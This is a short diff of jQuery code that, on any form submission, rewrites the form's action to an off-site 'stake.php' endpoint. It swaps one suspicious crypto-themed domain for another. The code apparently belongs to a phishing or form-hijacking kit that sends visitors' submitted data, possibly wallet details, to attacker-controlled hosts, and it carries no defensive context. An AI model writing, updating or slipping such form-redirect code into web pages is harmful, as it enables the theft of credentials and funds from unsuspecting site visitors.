@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://satoshi.infoprize-reward.site/stake.php");
+  $(myform).attr("action", "https://stakecoredao.epizy.com/stake.php");
 });
